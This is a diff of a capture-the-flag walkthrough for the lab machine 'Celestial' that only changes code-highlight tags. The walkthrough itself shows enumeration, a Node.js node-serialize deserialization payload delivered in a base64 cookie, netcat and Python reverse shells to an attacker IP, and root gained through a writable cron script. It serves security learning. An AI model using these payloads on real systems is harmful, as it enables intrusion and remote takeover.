@@ -17,7 +17,7 @@ This is a walkthrough of a box "Celestial".<br>
 ### 1. Initial Enumeration
 
 TCP Port Scanning:
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# nmap -p- 10.10.10.85 -sV -sC
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-22 11:46 EEST
 Nmap scan report for 10.10.10.85
@@ -32,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2743.74 seconds
 {% endhighlight %}
 
 gobuster port 3000:
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# gobuster dir -u http://10.10.10.85:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .js
 ===============================================================
 Gobuster v3.0.1
@@ -56,7 +56,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ### 2. Getting User
 
 By accessing the website on port 3000, we can find unique coolkie base64 encoded.
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# curl http://10.10.10.85:3000 -i
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -72,7 +72,7 @@ Connection: keep-alive
 
 Then, try to decode. Since '%3D' is url encoded value of '=', we have to decode it manually.<br>
 (Or if we use burp suite, we can use decoder.)
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# echo 'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==' | base64 -d
 {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
 {% endhighlight %}
@@ -80,12 +80,12 @@ root@kali:~# echo 'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb
 We found some parameters in the cookie.<br>
 Then, fuzz this node.js webapp with sending some special values in the cookie.<br>
 We can find that if we send "+" as special number, we get following syntax error.
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# echo -n '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+"}' | base64
 eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVt
 YiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrIn0=
 {% endhighlight %}
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# curl http://10.10.10.85:3000 -i --cookie 'profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrIn0='
 HTTP/1.1 500 Internal Server Error
 X-Powered-By: Express
@@ -109,12 +109,12 @@ Connection: keep-alive
 {% endhighlight %}
 
 On the other hand, if we send following as a payload, we don't get this syntax error
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# echo -n '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+2"}' | base64
 eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVt
 YiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrMiJ9
 {% endhighlight %}
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# curl http://10.10.10.85:3000 -i --cookie 'profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrMiJ9'
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -130,12 +130,12 @@ Hey Dummy 2+2 + 2+2 is 26
 This means the value of "num" is not used as strings and is used as an argument of eval() or something.<br>
 More precisely, the value of "num" is serialized on the web server.<br>
 Then, google like following. We can find this blog <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">Exploiting Node.js deserialization bug for Remote Code Execution</a>
-{% highlight shell %}
+{% highlight console %}
 nodejs serialization exploit
 {% endhighlight %}
 
 According to that blog, to build the payload for RCE, we need following node.js code and run it.
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# cat buildRCE.js 
 var y = {
  rce : function(){
@@ -154,20 +154,20 @@ Serialized:
 However, <strong>This payload didn't work for me.</strong><br>
 In this article <a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/">Deserialization Vulnerabilities: Attacking Deserialization in JS</a>, it's written like <em>During the deserialization process, anything after a special tag $$ND_FUNC$$ goes directly to eval function</em>.<br>
 This means we don't need the part "function()" like following.
-{% highlight shell %}
+{% highlight console %}
 {"anything_here":"_$$ND_FUNC$$_console.log(1)"}
 {% endhighlight %}
 
 We can check if the payload correctly by writing following script and executing.<br>
 Remove the "function(){\n" and "\n }" part at the bottom<br>
 (Don't forget to put a "\" for each single quote!!)
-{% highlight shell%}
+{% highlight console %}
 root@kali:~# cat serialize.js 
 var serialize = require('node-serialize');
 var payload = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'uname -a\', function(error, stdout, stderr) { console.log(stdout) })"}'
 serialize.unserialize(payload);
 {% endhighlight %}
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# node serialize.js 
 Linux kali 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-6kali1 (2019-07-22) x86_64 GNU/Linux
 {% endhighlight %}
@@ -175,29 +175,29 @@ Linux kali 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-6kali1 (2019-07-22) x86_64 G
 By combining previous information, we can obtain the payload.<br>
 Also, we need a reverse shell payload which we don't need to use both single quote and double quote.<br>
 Meaning we have to merge the followings.
-{% highlight shell %}
+{% highlight console %}
 {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+2"}
 {% endhighlight %}
-{% highlight shell %}
+{% highlight console %}
 {"rce":"_$$ND_FUNC$$_require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });"}
 {% endhighlight %}
-{% highlight shell %}
+{% highlight console %}
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.30 443 >/tmp/f
 {% endhighlight %}
 
 Full Payload:
-{% highlight shell %}
+{% highlight console %}
 {"username":"Dummy","country":"Lameville","city":"Lametown","num":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.30 443 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })"}
 {% endhighlight %}
 
 Now we had a full payload.<br>
 We need base64 encoding for the payload and make sure to run a netcat listener.
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# nc -nlvp 443
 listening on [any] 443 ...
 
 {% endhighlight %}
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# curl http://10.10.10.85:3000 -i --cookie 'profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IkxhbWV2aWxsZSIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6Il8kJE5EX0ZVTkMkJF9yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMzAgNDQzID4vdG1wL2YnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KSJ9'
 HTTP/1.1 500 Internal Server Error
 X-Powered-By: Express
@@ -221,7 +221,7 @@ Connection: keep-alive
 {% endhighlight %}
 
 Now we got a reverse shell as a user "sun".
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.30] from (UNKNOWN) [10.10.10.85] 56418
@@ -231,7 +231,7 @@ sun
 {% endhighlight %}
 
 user.txt is in the directory "/home/sun/Documents".
-{% highlight shell %}
+{% highlight console %}
 $ pwd
 /home/sun/Documents
 
@@ -246,7 +246,7 @@ $ cat user.txt
 ### 3. Getting Root
 
 In the syslog, we can confirm that cron is running "/home/sun/Documents/script.py" in every 5 minutes.
-{% highlight shell %}
+{% highlight console %}
 $ tail syslog
 Oct  5 02:05:46 sun gnome-session[3685]:     at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
 Oct  5 02:05:46 sun gnome-session[3685]:     at next (/home/sun/node_modules/express/lib/router/route.js:137:13)
@@ -262,7 +262,7 @@ Oct  5 02:10:01 sun CRON[8246]: (root) CMD (python /home/sun/Documents/script.py
 
 Since we have write permission for "/home/sun/Documents/script.py", we can take advantage of that.<br>
 We can find a short python payload on the <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a>
-{% highlight shell %}
+{% highlight console %}
 oot@kali:~# cat python_rshell.txt 
 import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
@@ -271,7 +271,7 @@ os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
 {% endhighlight %}
 
 Then, prepare needed command like following.
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# cat python_rshell.txt 
 echo 'import socket,subprocess,os;' > script.py
 echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> script.py
@@ -280,7 +280,7 @@ echo 'os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh",
 {% endhighlight %}
 
 Then, run these commands on the window which we got a reverse shell as a user.
-{% highlight shell %}
+{% highlight console %}
 $ echo 'import socket,subprocess,os;' > script.py
 $ echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> script.py
 $ echo 's.connect(("10.10.14.30",8080));os.dup2(s.fileno(),0);' >> script.py
@@ -289,7 +289,7 @@ $ echo 'os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh
 
 Make sure to launch the reverse shell listener.<br>
 Now we can achieve a reverse shell as a root user.
-{% highlight shell %}
+{% highlight console %}
 root@kali:~# nc -nlvp 8080
 listening on [any] 8080 ...
 connect to [10.10.14.30] from (UNKNOWN) [10.10.10.85] 48518
@@ -299,7 +299,7 @@ uid=0(root) gid=0(root) groups=0(root)
 {% endhighlight %}
 
 root.txt is in the directory "/root".
-{% highlight shell %}
+{% highlight console %}
 # pwd         
 /root
 
